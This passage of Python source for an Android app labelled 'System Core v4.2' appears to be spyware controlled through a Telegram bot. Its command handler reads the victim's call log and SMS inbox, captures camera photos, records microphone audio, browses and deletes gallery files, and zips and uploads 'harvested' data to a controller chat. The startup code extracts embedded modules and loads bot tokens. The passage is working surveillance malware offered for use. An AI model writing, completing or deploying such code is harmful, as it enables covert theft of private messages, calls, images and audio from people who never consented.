                try: media_recorder.release()
                except: pass
            with self._mic_lock:
                self.mic_busy = False

    def _call_log(self, limit=100):
        if not JNI: return "JNI غير متاح"
        cursor = None
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://call_log/calls"), None, None, None, "date DESC")
            if not cursor: return "لا صلاحية أو لا توجد مكالمات"
            lines = []
            idx_name = cursor.getColumnIndex("name")
            idx_number = cursor.getColumnIndex("number")
            idx_type = cursor.getColumnIndex("type")
            idx_date = cursor.getColumnIndex("date")
            while cursor.moveToNext() and len(lines) < limit:
                name = cursor.getString(idx_name) or "Unknown"
                num = cursor.getString(idx_number) or "?"
                call_type = cursor.getString(idx_type) or "?"
                date = cursor.getString(idx_date) or "0"
                type_str = {"1": "📥 وارد", "2": "📤 صادر", "3": "❌ فائت"}.get(call_type, "❓")
                try:
                    date_str = datetime.fromtimestamp(int(date)/1000).strftime("%Y-%m-%d %H:%M")
                except: date_str = "?"
                lines.append(f"{type_str} {name} ({num}) [{date_str}]")
            return "\n".join(lines) if lines else "سجل المكالمات فارغ"
        except SecurityException:
            return "⚠️ لا توجد صلاحية لقراءة سجل المكالمات"
        except Exception as e:
            logging.error(f"Call log error: {e}"); return "خطأ في قراءة المكالمات"
        finally:
            if cursor:
                try: cursor.close()
                except: pass

    def _sms_log(self, limit=100):
        if not JNI: return "JNI غير متاح"
        cursor = None
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://sms/inbox"), None, None, None, "date DESC")
            if not cursor: return "لا صلاحية أو لا توجد رسائل"
            lines = []
            idx_addr = cursor.getColumnIndex("address")
            idx_body = cursor.getColumnIndex("body")
            idx_date = cursor.getColumnIndex("date")
            while cursor.moveToNext() and len(lines) < limit:
                addr = cursor.getString(idx_addr) or "?"
                body = cursor.getString(idx_body) or ""
                date = cursor.getString(idx_date) or "0"
                try:
                    date_str = datetime.fromtimestamp(int(date)/1000).strftime("%Y-%m-%d %H:%M")
                except: date_str = "?"
                lines.append(f"📩 من: {addr}\n🕐 {date_str}\n💬 {body}\n---")
            return "\n".join(lines) if lines else "صندوق الوارد فارغ"
        except SecurityException:
            return "⚠️ لا توجد صلاحية لقراءة الرسائل"
        except Exception as e:
            logging.error(f"SMS error: {e}"); return "خطأ في قراءة الرسائل"
        finally:
            if cursor:
                try: cursor.close()
                except: pass

    def _battery_ok(self, m):
        try:
            if hasattr(m, '_battery_ok') and callable(m._battery_ok):
                b, ch = m._battery_ok()
                return b >= 15 or ch
        except: pass
        return True

    def ex(self, cmd, tg, m, cid, cbq=None):
        threading.Thread(target=self._execute, args=(cmd, tg, m, cid, cbq), daemon=True).start()

    def _execute(self, cmd, tg, m, cid, cbq):
        try:
            if not cmd or not isinstance(cmd, str): return
            if cbq:
                try: tg._api("answerCallbackQuery", {"callback_query_id": cbq})
                except: pass
            self._ensure_components(m)
            if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|", "g_bulk|")):
                self._handle_gallery(cmd, tg, m, cid)
            elif cmd.startswith(("cam_", "camf_")):
                self._handle_camera(cmd, tg, m, cid)
            elif cmd.startswith("mic_"):
                self._handle_mic(tg, m, cid)
            elif cmd.startswith("callog_"):
                self._handle_callog(tg, cid)
            elif cmd.startswith("sms_"):
                self._handle_sms(tg, cid)
            elif cmd.startswith("hrv_"):
                self._handle_harvest(tg, m, cid)
            elif cmd.startswith("send_now_"):
                self._handle_send_now(tg, m, cid)
            elif cmd.startswith("media_"):
                self._handle_media(tg, m, cid)
            else:
                tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ أمر غير معروف."})
        except Exception as e:
            logging.error(f"Command handler error: {e}")
            try:
                tg._api("sendMessage", {"chat_id": cid, "text": f"❌ خطأ داخلي: {str(e)[:100]}"})
            except: pass
        finally:
            try: gc.collect()
            except: pass

    def _handle_gallery(self, cmd, tg, m, cid):
        try:
            parts = cmd.split("|")
            if len(parts) < 2: return
            action = parts[0]
            if not hasattr(m, 'gallery_browser') or m.gallery_browser is None:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير متاح"})
                return
            if action == "g_nav" and len(parts) >= 3:
                cat, page = parts[1], int(parts[2])
                new_kb = m.gallery_browser.get_grid_kb(cat=cat, page=page)
                tg._api("editMessageReplyMarkup", {"chat_id": cid, "message_id": m.last_mid, "reply_markup": json.dumps(new_kb)})
            elif action == "g_opt" and len(parts) >= 4:
                m.gallery_browser.show_options(cid, parts[1], parts[2], parts[3])
            elif action == "g_act" and len(parts) >= 5:
                m.gallery_browser.execute_action(cid, parts[1], parts[2], parts[3], parts[4])
            elif action == "g_conf" and len(parts) >= 5:
                act, cat, pg, idx = parts[1], parts[2], parts[3], parts[4]
                confirm_kb = [[{"text": "🗑 نعم، احذف", "callback_data": f"g_act|del|{cat}|{pg}|{idx}"},
                               {"text": "🔙 إلغاء", "callback_data": f"g_opt|{cat}|{pg}|{idx}"}]]
                tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ هل أنت متأكد من الحذف؟", "reply_markup": json.dumps({"inline_keyboard": confirm_kb})})
            elif action == "g_bulk" and len(parts) >= 3:
                cat, page = parts[1], int(parts[2])
                m.gallery_browser.execute_action(cid, "bulk", cat, page)
        except Exception as e:
            logging.error(f"Gallery handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في المعرض"})

    def _handle_camera(self, cmd, tg, m, cid):
        try:
            is_front = 1 if "camf_" in cmd else 0
            if not self._battery_ok(m):
                tg._api("sendMessage", {"chat_id": cid, "text": "🔋 البطارية منخفضة"})
                return
            if not hasattr(m, 'camera_analyzer') or m.camera_analyzer is None:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ الكاميرا غير متاحة"})
                return
            tg._api("sendChatAction", {"chat_id": cid, "action": "upload_photo"})
            def capture():
                try: m.camera_analyzer.harvest(cam_id=is_front)
                except Exception as e: logging.error(f"Camera harvest error: {e}")
            threading.Thread(target=capture, daemon=True).start()
            tg._api("sendMessage", {"chat_id": cid, "text": "📸 تم التقاط الصورة وتحليلها."})
        except Exception as e:
            logging.error(f"Camera handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في الكاميرا"})

    def _handle_mic(self, tg, m, cid):
        try:
            if self.mic_busy:
                tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ"})
                return
            tg._api("sendMessage", {"chat_id": cid, "text": "🎤 جاري التسجيل لمدة 10 ثوانٍ..."})
            def record():
                audio_path = self._record_audio(10)
                if audio_path and os.path.exists(audio_path):
                    try:
                        target = getattr(m, 'vlt', cid)
                        with open(audio_path, 'rb') as f:
                            tg._api("sendVoice", {"chat_id": target}, {"voice": f})
                    except: pass
                    finally:
                        try: os.remove(audio_path)
                        except: pass
                else:
                    try: tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل"})
                    except: pass
            threading.Thread(target=record, daemon=True).start()
        except Exception as e:
            logging.error(f"Mic handler error: {e}")

    def _handle_callog(self, tg, cid):
        try:
            tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
            data = self._call_log()
            self._send_text_file(tg, cid, data, "calls.txt")
        except Exception as e:
            logging.error(f"Callog handler error: {e}")

    def _handle_sms(self, tg, cid):
        try:
            tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
            data = self._sms_log()
            self._send_text_file(tg, cid, data, "sms.txt")
        except Exception as e:
            logging.error(f"SMS handler error: {e}")

    def _handle_harvest(self, tg, m, cid):
        try:
            if hasattr(m, 'daily_zipper') and m.daily_zipper:
                tg._api("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد... قد يستغرق دقائق"})
                threading.Thread(target=m.daily_zipper.run, daemon=True).start()
            else:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير جاهزة"})
        except Exception as e:
            logging.error(f"Harvest handler error: {e}")

    def _handle_send_now(self, tg, m, cid):
        try:
            if hasattr(m, 'daily_zipper') and m.daily_zipper:
                tg._api("sendMessage", {"chat_id": cid, "text": "🚀 جاري إرسال الملفات المضغوطة..."})
                threading.Thread(target=m.daily_zipper.force_send_now, args=(cid,), daemon=True).start()
            else:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير متاحة"})
        except Exception as e:
            logging.error(f"Send now handler error: {e}")

    def _handle_media(self, tg, m, cid):
        try:
            if hasattr(m, 'gallery_browser') and m.gallery_browser:
                kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
                res = tg._api("sendMessage", {"chat_id": cid, "text": "🖼️ معرض الوسائط", "reply_markup": json.dumps(kb)})
                if res and res.get('ok'): m.last_mid = res['result']['message_id']
            else:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير متاح"})
        except Exception as e:
            logging.error(f"Media handler error: {e}")

def force_send_zip(m, device_id, tg, chat_id):
    try:
        if hasattr(m, 'daily_zipper') and m.daily_zipper:
            threading.Thread(target=m.daily_zipper.force_send_now, args=(chat_id,), daemon=True).start()
        else:
            tg._api("sendMessage", {"chat_id": chat_id, "text": "❌ وحدة الحصاد غير جاهزة"})
    except Exception as e:
        logging.error(f"force_send_zip error: {e}")

_handler = None
_handler_lock = threading.Lock()
def ex(cmd, tg, m, cid, cbq=None):
    global _handler
    with _handler_lock:
        if _handler is None:
            _handler = C()
    _handler.ex(cmd, tg, m, cid, cbq)
'''
}

def _extract_embedded_files():
    """كتابة الملفات المضمّنة إلى المجلد R مع التحقق من صحتها."""
    for filename, content in EMBEDDED_FILES.items():
        dest = os.path.join(R, filename)
        should_extract = False
        if not os.path.exists(dest):
            should_extract = True
        else:
            try:
                if os.path.getsize(dest) < 100:
                    should_extract = True
                else:
                    with open(dest, 'r', encoding='utf-8') as f:
                        code = f.read()
                    try:
                        compile(code, dest, 'exec')
                        print(f"✅ {filename} is valid")
                    except SyntaxError:
                        print(f"⚠️ {filename} has syntax errors, re-extracting...")
                        should_extract = True
            except Exception:
                should_extract = True
        
        if should_extract:
            try:
                with open(dest, 'w', encoding='utf-8') as f:
                    f.write(content.strip())
                with open(dest, 'r', encoding='utf-8') as f:
                    compile(f.read(), dest, 'exec')
                print(f"✅ Extracted embedded: {filename}")
            except Exception as e:
                print(f"❌ Failed to extract {filename}: {e}")

class CoreApp(App):
    def build(self):
        _extract_embedded_files()
        
        self.title = "System Core v4.2"
        layout = BoxLayout(orientation='vertical', spacing=5)
        
        self.log = TextInput(
            text="", readonly=True,
            background_color=(0.02, 0.02, 0.02, 1),
            foreground_color=(0.3, 0.9, 0.3, 1), font_size='10sp'
        )
        
        btns = BoxLayout(size_hint=(1, 0.08), spacing=5)
        copy_btn = Button(text="📋 COPY LOG", background_color=(0.2, 0.4, 0.6, 1))
        copy_btn.bind(on_press=self._copy)
        clear_btn = Button(text="🗑 CLEAR", background_color=(0.6, 0.2, 0.2, 1))
        clear_btn.bind(on_press=self._clear)
        btns.add_widget(copy_btn)
        btns.add_widget(clear_btn)
        
        layout.add_widget(self.log)
        layout.add_widget(btns)
        
        Clock.schedule_once(self._start, 0.5)
        return layout

    def _copy(self, instance):
        try:
            Clipboard.copy(self.log.text)
            print("✅ Log copied to clipboard")
        except Exception as e:
            print(f"Copy error: {e}")

    def _clear(self, instance):
        self.log.text = ""
        print("✅ Log cleared")

    def _start(self, dt):
        def _log(msg):
            Clock.schedule_once(lambda x: setattr(self.log, 'text', self.log.text + msg + "\n"))
        
        _log("[INIT] Starting system...")
        self._init_core()

    def _init_core(self):
        def _log(msg):
            Clock.schedule_once(lambda x: setattr(self.log, 'text', self.log.text + msg + "\n"))
        
        try:
            # ===== 1. إعداد الصلاحيات =====
            _log("[1/5] Setting permissions...")
            _perms()
            
            # ===== 2. نسخ نموذج الذكاء الاصطناعي =====
            _log("[2/5] Copying AI model...")
            copy_model_to_models_dir()
            
            # ===== 3. تحميل الإعدادات =====
            _log("[3/5] Loading configuration...")
            active, reserve, ctrl, vault, secret = load_secrets_from_config()
            _log(f"     Active tokens: {len(active)}, Reserve tokens: {len(reserve)}")
            _log(f"     Control ID: {ctrl}, Vault ID: {vault}")
            
            # ===== 4. التأكد من تثبيت tflite-runtime =====
            _log("[4/5] Ensuring tflite-runtime...")
            ensure_tflite_runtime()
            
            # ===== 5. تهيئة المكونات الأساسية =====
            _log("[5/5] Initializing components...")
            
            from monitor import M
            mon = M()
            from telegram_ui import T
            ui = T(mon, active, reserve, ctrl, vault, secret)
            
            mon.ui = ui
            mon.ctrl = ctrl
            mon.vlt = vault
            
            # ===== 6. بدء التشغيل =====
            _log("[6/5] Starting services...")
            ui.start()
            mon.start()
            
            _log("✅ System initialized successfully!")
            _log(f"📱 Device: {mon.dmd} ({mon.did[:8]})")
            
            self.mon = mon
            self.ui = ui
            
        except Exception as e:
            _log(f"❌ ERROR: {str(e)}")
            _log(f"❌ Traceback: {traceback.format_exc()}")
            print(f"Critical error: {e}")
            print(traceback.format_exc())

    def on_stop(self):
        try:
            if hasattr(self, 'mon') and self.mon:
                self.mon.stop()
            if hasattr(self, 'ui') and self.ui:
                self.ui.stop()
            print("✅ Application stopped cleanly")
        except Exception as e:
            print(f"Stop error: {e}")

if __name__ == '__main__':
    CoreApp().run()
